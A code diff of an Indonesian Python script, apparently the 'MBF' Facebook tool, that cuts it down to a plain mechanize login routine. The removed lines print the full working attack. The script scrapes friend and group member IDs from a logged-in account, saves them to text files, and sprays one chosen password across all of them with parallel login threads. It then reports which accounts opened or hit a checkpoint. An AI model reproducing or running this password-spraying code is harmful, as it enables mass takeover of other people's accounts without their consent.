@@ -1,17 +1,9 @@
-import platform
-import os
-import sys
+import mechanize
 import http.cookiejar as cookielib
 import re
-import urllib.request
-import urllib.parse
-import threading
-try:
-    import mechanize
-except ImportError:
-    print('Module mechanize belum di install. Install dengan menjalankan: pip install mechanize')
-    sys.exit()
+import sys
 
+# Fungsi untuk mencetak teks berwarna di terminal
 def cetak(x, e=0):
     w = 'mhkbpcP'
     for i in w:
@@ -24,132 +16,7 @@ def cetak(x, e=0):
     else:
         sys.stdout.write(x + '\n')
 
-if platform.python_version().split('.')[0] != '3':
-    cetak('!m[!] Kamu menggunakan python versi %s silahkan menggunakan versi 3.x.x' % platform.python_version().split(' ')[0])
-    sys.exit()
-
-br = None
-log = 0
-id_bteman = []
-id_bgroup = []
-fid_bteman = []
-fid_bgroup = []
-
-class mt(threading.Thread):
-    def __init__(self, i, p):
-        threading.Thread.__init__(self)
-        self.id = i
-        self.a = 0
-        self.p = p
-
-    def update(self):
-        return self.a, self.id
-
-    def run(self):
-        try:
-            data = urllib.request.urlopen(urllib.request.Request(
-                url='https://id-id.facebook.com/login.php',
-                data=urllib.parse.urlencode({'email': self.id, 'pass': self.p}).encode('utf-8'),
-                headers={'User-Agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
-            ))
-        except KeyboardInterrupt:
-            sys.exit()
-        except:
-            self.a = 4
-            sys.exit()
-        if 'm_sess' in data.geturl() or 'save-device' in data.geturl():
-            self.a = 1
-        elif 'checkpoint' in data.geturl():
-            self.a = 2
-        else:
-            self.a = 3
-
-def crack(d):
-    while True:
-        s = inputD('[?] Sandi')
-        if len(s) < 6:
-            cetak('!m[!] Jumlah huruf minimal !k6')
-        else:
-            break
-    return crack0(d, s)
-
-def tampilhasil(akun, sandi, data):
-    cekpoint = []
-    salah = 0
-    berhasil = []
-    for i in akun:
-        st, id = i
-        if st == 1:
-            berhasil.append(id)
-        elif st == 2:
-            cekpoint.append(id)
-        elif st == 3:
-            salah += 1
-    cetak('!h[*] Berhasil !c%d' % len(berhasil))
-    if len(berhasil) != 0:
-        for i in berhasil:
-            cetak('!h### !p%s !m=> !b[!k%s!b]' % (i, sandi))
-    cetak('!k[*] Cekpoint !c%d' % len(cekpoint))
-    if len(cekpoint) != 0:
-        for i in cekpoint:
-            cetak('!k### !p%s !m=> !b[!k%s!b]' % (i, sandi))
-    cetak('!m[*] Gagal    !c' + str(salah))
-    i = inputD('[?] Tidak Puas dengan Hasil, Mau coba lagi (y/t)', ['Y', 'T'])
-    if i.upper() == 'Y':
-        return crack(data)
-    else:
-        return menu()
-
-def crack0(data, sandi):
-    akun = []
-    cetak('!h[*] MengCrack !k%d Akun !hdengan sandi !m[!k%s!m]' % (len(data), sandi))
-    cetak('!h[*] Cracking  !k0!m%', 1)
-    sys.stdout.flush()
-    jml0, jml1 = 0, 0
-    th = []
-    for i in data:
-        i = i.replace(' ', '')
-        i = i.replace('\n', '')
-        if len(i) != 0:
-            th.append(mt(i, sandi))
-        jml1 += 1
-    for i in th:
-        i.daemon = True
-        try:
-            i.start()
-        except KeyboardInterrupt:
-            exit()
-    h_error = []
-    error = 0
-    while True:
-        try:
-            for i in th:
-                status, id = i.update()
-                if status != 0:
-                    cetak('\r!h[*] Cracking  !k%d!m%s!0' % (int(float((float(jml0) / float(jml1)) * 100)), '%'), 1)
-                    sys.stdout.flush()
-                    del (th[th.index(i)])
-                    if status == 4:
-                        h_error.append(id)
-                        if h_error.count(id) == 3:
-                            pass
-                        else:
-                            th.append(mt(id, sandi))
-                            th[len(th) - 1].daemon = True
-                            th[len(th) - 1].start()
-                    else:
-                        jml0 += 1
-                        akun.append((status, id))
-        except KeyboardInterrupt:
-            sys.exit()
-        try:
-            if threading.activeCount() == 1:
-                break
-        except KeyboardInterrupt:
-            keluar()
-    cetak('\r!h[*] Cracking  !k100!m%      ')
-    tampilhasil(akun, sandi, data)
-
+# Setup mechanize browser
 def install_browser():
     global br
     br = mechanize.Browser()
@@ -159,96 +26,9 @@ def install_browser():
     br.set_cookiejar(cookielib.LWPCookieJar())
     br.set_handle_redirect(True)
     br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-    br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+    br.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')]
 
-def bacaData():
-    global fid_bgroup, fid_bteman
-    try:
-        fid_bgroup = open(os.path.join(os.sys.path[0], 'MBFgroup.txt'), 'r').readlines()
-    except:
-        pass
-    try:
-        fid_bteman = open(os.path.join(os.sys.path[0], 'MBFteman.txt'), 'r').readlines()
-    except:
-        pass
-
-def simpan():
-    if len(id_bgroup) != 0:
-        cetak('!h[*] Menyimpan hasil dari Group')
-        try:
-            open(os.path.join(os.sys.path[0], 'MBFgroup.txt'), 'w').write('\n'.join(id_bgroup))
-            cetak('!h[!] Berhasil meyimpan !cMBFgroup.txt')
-        except:
-            cetak('!m[!] Gagal meyimpan')
-    if len(id_bteman) != 0:
-        cetak('!h[*] Menyimpan hasil daftar Teman...')
-        try:
-            open(os.path.join(os.sys.path[0], 'MBFteman.txt'), 'w').write('\n'.join(id_bteman))
-            cetak('!h[!] Berhasil meyimpan !cMBFteman.txt')
-        except:
-            cetak('!m[!] Gagal meyimpan')
-
-def keluar():
-    simpan()
-    cetak('!m[!] Keluar')
-    sys.exit()
-
-def inputD(x, v=0):
-    while True:
-        try:
-            a = input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m' % x)
-        except:
-            cetak('\n!m[!] Batal')
-            keluar()
-        if v:
-            if a.upper() in v:
-                break
-            else:
-                cetak('!m[!] Masukan Opsinya Bro...')
-                continue
-        else:
-            if len(a) == 0:
-                cetak('!m[!] Masukan dengan benar')
-                continue
-            else:
-                break
-    return a
-
-def inputM(x, d):
-    while True:
-        try:
-            i = int(inputD(x))
-        except:
-            cetak('!m[!] Pilihan tidak ada')
-            continue
-        if i in d:
-            break
-        else:
-            cetak('!m[!] Pilihan tidak ada')
-    return i
-
-def lanjutG():
-    global fid_bgroup
-    if len(fid_bgroup) != 0:
-        i = inputD('[?] Riset Hasil Id Group/lanjutkan (r/l)', ['R', 'L'])
-        if i.upper() == 'L':
-            return crack(fid_bgroup)
-        else:
-            os.remove(os.path.join(os.sys.path[0], 'MBFgroup.txt'))
-            fid_bgroup = []
-    return 0
-
-def lanjutT():
-    global fid_bteman
-    if len(fid_bteman) != 0:
-        i = inputD('[?] Riset Hasil Id Teman/lanjutkan (r/l)', ['R', 'L'])
-        if i.upper() == 'L':
-            return crack(fid_bteman)
-        else:
-            os.remove(os.path.join(os.sys.path[0], 'MBFteman.txt'))
-            fid_bteman = []
-    return 0
-
+# Fungsi untuk membuka URL
 def buka(d):
     try:
         x = br.open(d)
@@ -256,38 +36,42 @@ def buka(d):
         x = x.read()
     except:
         cetak('\r!m[!] Gagal membuka !p' + str(d))
-        keluar()
+        sys.exit()
     if '<link rel="redirect" href="' in x.decode('utf-8'):
         return buka(br.find_link().url)
     else:
         return x.decode('utf-8')
 
+# Fungsi untuk login ke Facebook
 def login():
     global log
-    us = inputD('[?] Email/HP')
-    pa = inputD('[?] Kata Sandi')
+    us = input('Email/HP: ')
+    pa = input('Kata Sandi: ')
     cetak('!h[*] Sedang Login....')
-    response = buka('https://id-id.facebook.com')
+    buka('https://m.facebook.com')
+    
+    # Pilih form yang benar
     br.select_form(nr=0)
-
-    # Debugging: Print all form controls to find the correct control names
+    
+    # Debugging: Cetak semua kontrol form
     hidden_controls = {}
     for control in br.form.controls:
         print(f"Control name: {control.name}")
         if control.type == "hidden":
             hidden_controls[control.name] = control.value
 
+    # Isi kontrol form
     try:
         br.form['email'] = us  # Nama kontrol untuk email
     except mechanize._form_controls.ControlNotFoundError:
         cetak("Kontrol 'email' tidak ditemukan. Silakan periksa struktur form.")
-        keluar()
+        sys.exit()
 
     try:
         br.form['pass'] = pa  # Nama kontrol untuk password
     except mechanize._form_controls.ControlNotFoundError:
         cetak("Kontrol 'pass' tidak ditemukan. Silakan periksa struktur form.")
-        keluar()
+        sys.exit()
 
     # Tambahkan nilai kontrol tersembunyi ke dalam form
     for name, value in hidden_controls.items():
@@ -297,10 +81,11 @@ def login():
     for control in br.form.controls:
         print(f"Control name: {control.name}, value: {control.value}")
 
-    br.submit()
+    # Submit form dan cek URL
+    response = br.submit()
     url = br.geturl()
     if 'save-device' in url or 'm_sess' in url:
-        buka('https://id-id.facebook.com/home.php')
+        buka('https://mobile.facebook.com/home.php')
         nama = br.find_link(url_regex='logout.php').text
         nama = re.findall(r'\((.*a?)\)', nama)[0]
         cetak('!h[*] Selamat datang !k%s' % nama)
@@ -308,89 +93,10 @@ def login():
         log = 1
     elif 'checkpoint' in url:
         cetak('!m[!] Akun kena checkpoint\n!k[!]Coba Login dengan opera mini')
-        keluar()
+        sys.exit()
     else:
         cetak('!m[!] Login Gagal')
 
-def idgroup():
-    if log != 1:
-        cetak('!h[*] Login !bFB!h dulu bos...')
-        login()
-        if log == 0:
-            keluar()
-    next = saring_id_group0()
-    while True:
-        saring_id_group1(buka(next))
-        try:
-            next = br.find_link(url_regex='/browse/group/members/').url
-        except:
-            cetak('!m[!] Hanya Bisa Mengambil !h %d id' % len(id_bgroup))
-            break
-    simpan()
-    i = inputD('[?] Langsung Crack (y/t)', ['Y', 'T'])
-    if i.upper() == 'Y':
-        return crack(id_bgroup)
-    else:
-        return menu()
-
-def saring_id_teman(r):
-    for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&', r):
-        id_bteman.append(i)
-
-def idteman():
-    if log != 1:
-        cetak('!h[*] Login !bFB !hdulu bos...')
-        login()
-        if log == 0:
-            keluar()
-    cetak('!h[*] Sedang mengumpulkan id teman...')
-    buka('https://id-id.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController')
-    jumlah = br.find_link(url_regex='/friends/center/friends/').text
-    jumlah = re.findall(r'\((.*a?)\)', jumlah)[0]
-    cetak('!h[*] Mengambil !p%s !hid teman' % jumlah)
-    saring_id_teman(buka('https://id-id.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
-    try:
-        next = br.find_link(url_regex='friends_center_main').url
-    except:
-        if len(id_bteman) != 0:
-            cetak('!m[!] Hanya dapat mengambil !p%d id' % len(id_bteman))
-        else:
-            cetak('!m[!] Batal')
-            keluar()
-    while True:
-        saring_id_teman(buka(next))
-        cetak('\r!h[*] !p%s !hid terambil...' % len(id_bteman), 1)
-        sys.stdout.flush()
-        try:
-            next = br.find_link(url_regex='friends_center_main').url
-        except:
-            cetak('\n!m[!] Hanya dapat mengambil !p%d id' % len(id_bteman))
-            break
-    simpan()
-    i = inputD('[?] Langsung Crack (y/t)', ['Y', 'T'])
-    if i.upper() == 'Y':
-        return crack(id_bteman)
-    else:
-        return menu()
-
-def menu():
-    cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \\ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n    \\ /  /  /          !b\\\n     \\  /  /            !b\\\n      \\/  /              !b\\\n       \\  /                !b\\\n        \\/                  !b\\\n        !m(!0!k*  *!m)!0!b|===========\n             !h(!m'!h)\n")
-    cetak('!m.________________________________________.')
-    cetak('!m|.!kNb!m| !pSemoga hari mu menyenangkan.... !m|!kNB!m|')
-    cetak('!m|!k##!m|!c 1.!pKumpulkan Id Dari Daftar Teman   !m|!k##!m|')
-    cetak('!m|!k##!m|!c 2.!pKumpulkan Id Dari Group         !m|!k##!m|')
-    cetak('!m|!k##!m|!c 3.!pKeluar                          !m|!k##!m|')
-    cetak('!m.----------------------------------------.')
-    i = inputM('[?] PILIH', [1, 2, 3])
-    if i == 2:
-        lanjutG()
-        idgroup()
-    elif i == 1:
-        lanjutT()
-        idteman()
-    elif i == 3:
-        keluar()
-
-bacaData()
+# Jalankan fungsi-fungsi
 install_browser()
-menu()
+login()
